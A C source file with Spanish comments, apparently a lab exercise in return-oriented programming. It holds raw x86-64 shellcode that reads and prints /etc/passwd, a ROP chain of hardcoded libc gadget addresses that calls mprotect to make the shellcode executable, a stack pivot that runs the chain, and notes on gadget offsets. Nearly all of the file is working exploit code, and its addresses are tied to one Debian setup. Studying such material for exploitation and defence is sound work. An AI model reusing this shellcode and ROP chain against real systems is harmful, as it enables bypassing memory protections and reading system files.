// Usaremos los gadgets de la debian /lib/x86_64-linux-gnu/libc.so.6

#include <stdio.h>
#include <string.h>

enum{
    Sz = 8 * 1024,
};

char shellcode[Sz] = {
    // your shellcode to dump /etc/passwd
  0x49, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0x10,
  0x49, 0xc1, 0xe8, 0x34, 0x4c, 0x29, 0xc4, 0x49, 0xb9, 0x2f,
  0x65, 0x74, 0x63, 0x2f, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0xff,
  0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x49, 0xc1, 0xea,
  0x08, 0x41, 0x52, 0x41, 0x51, 0x48, 0xb8, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0x2f, 0x48, 0xc1, 0xe8, 0x3c, 0x48,
  0x89, 0xe7, 0x48, 0xbe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x4f, 0x1a, 0x48, 0xc1, 0xee, 0x34, 0x48, 0x31, 0xd2, 0x0f,
  0x05, 0x49, 0x89, 0xc0, 0x4d, 0x31, 0xd2, 0x4d, 0x39, 0xd0,
  0x7c, 0x66, 0x49, 0xbb, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x0f, 0x40, 0x49, 0xc1, 0xeb, 0x34, 0x4c, 0x29, 0xdc, 0x48,
  0x31, 0xc0, 0x4c, 0x89, 0xc7, 0x48, 0x89, 0xe6, 0x48, 0xba,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x0f, 0x40, 0x48, 0xc1,
  0xea, 0x34, 0x0f, 0x05, 0x49, 0x89, 0xc1, 0x4d, 0x39, 0xd1,
  0x7c, 0x34, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0xff, 0x1f, 0x48, 0xc1, 0xe8, 0x3c, 0x48, 0x31, 0xff, 0x48,
  0xf7, 0xdf, 0x48, 0x89, 0xe6, 0x4c, 0x89, 0xca, 0x0f, 0x05,
  0x4d, 0x39, 0xd1, 0x77, 0xbe, 0x48, 0xb8, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0xff, 0x3c, 0x48, 0xc1, 0xe8, 0x38, 0x48,
  0x31, 0xff, 0x0f, 0x05, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0xff, 0x3c, 0x48, 0xc1, 0xe8, 0x38, 0x48, 0x31,
  0xff, 0x48, 0xf7, 0xdf, 0x0f, 0x05

};

char newstack[Sz] = {

    // your ROP chain to execute mprotect and jump to the shellcode

    /*
    //mprotect:
    0xa4,0xdc,0xea,0xf7,0xff,0x7f,  // popq rax 7F FF F7 EA DC A4
    0xA,                            // rax = 10

    0x84,0x97,0xf1,0xf7,0xff,0x7f,  // popq rdi 7F FF F7 F1 97 84
    0x00,0x80,0x55,0x55,0x55,0x55,  // ¿rdi? Puntero a shellcode 0x55 55 55 55 80 00

    0x0F,0x69,0xdd,0xf7,0xff,0x7f,  // popq rsi 7F FF F7 DD 69 0F
    0xb1,                           // rsi = 177 bytes

    0x06,0x31,0xdb,0xf7,0xff,0x7f,  // popq rdx 7F FF F7 DB 31 06
    0x7,                            // rdx = 7
   
    0xda,0x60,0xe0,0xf7,0xff,0x7f,  // syscall y retq 7F FF F7 E0 60 DA
    0x00,0x80,0x55,0x55,0x55,0x55,  // shellcode = 0x55 55 55 55 80 00

    // ARRIBA PONES 0x555555558000
    // ABAJO PONES 0x555555558040
    */

    
   //mkdir: 0x000eeb00 + 0x55..55800 == 55 55 55 64 6B 00
   /*
    0xa4,0x7c,0x65,0x55,0x55,0x55,  // popq rax 55 55 55 65 7C A4
    0x53,                            // rax = 83
    
    0x84,0x37,0x6C,0x55,0x55,0x55,  // popq rdi 55 55 55 6C 37 84             
    0xaa,0x4b,0x43,0x2f,0x78,0x75,0x6e,0x6d,0x65,0x72,0x2f,0x65,0x6d,0x6f,0x68,0x2f,  // /home/remnux/CK al revés
   
    0x0F,0x09,0x58,0x55,0x55,0x55,  // popq rsi 55 55 55 58 09 0F
    0x7,                            // rsi = 7

    0x55,0x55,0x55,0x64,0x6b,0x00   // mkdir
    */


   //DEFINITIVO:
    0xa4,0xfc,0xef,0xf7,0xff,0x7f,0x00,0x00,  
    0x0a,0x00,0x00,0x00,0x00,0x00,0x00,0x00,                            

    0x84,0xb7,0xf6,0xf7,0xff,0x7f,0x00,0x00,  
    0x00,0x80,0x55,0x55,0x55,0x55,0x00,0x00,   

    0x0f,0x89,0xe2,0xf7,0xff,0x7f,0x00,0x00,  
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,                           

    0xcd,0xb1,0xec,0xf7,0xff,0x7f,0x00,0x00,  
    0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,                           
   
    0xda,0x80,0xe5,0xf7,0xff,0x7f,0x00,0x00,  
    0x60,0x80,0x55,0x55,0x55,0x55,0x00,0x00,  


};

int
main(int argc, char** argv)
{
    printf("hi!\n");
    printf("%p\n",shellcode);
    asm(
        "movq %0, %%rsp\n\t"
        "retq\n\t"
        :
        : "r" (newstack)
    );
}

//rsi rax=10 rdi=8x1024 rdx=rwx=7
//rsi rdi 

/*
En gg.txt:

  base shellcode == 0x00007ffff7e00000

  0x000ffca4                 58  popq %rax
  0x000ffca5                 c3  retq
  libc = 7FFFF7EFFCA4

  0x0016b784                 5f  popq %rdi
  0x0016b785                 c3  retq
  libc = 7FFFF7F6B784

  0x0002890f                 5e  popq %rsi
  0x00028910                 c3  retq
  libc = 7FFFF7E2890F

NOSE SI ESTE ESTA BIEN COGIDO!!
  0x000cb1cd                 5a  popq %rdx
  0x000cb1ce                 c3  retq
  libc = 7FFFF7ECB1CD





  0x000580da               0f05  syscall
  0x000580dc                 c3  retq
  METER AQUI SHELLCODE == 7FFFF7E060DA



  mprotect == 0x000f8c20 == 55 55 55 65 0C 20
  mkdir == 0x000eeb00 == 


  0x00081ac5                 5c  popq %rsp
  0x00081ac6                 c3  retq

  0x000816c9                 5d  popq %rbp
  0x000816ca                 c3  retq

  */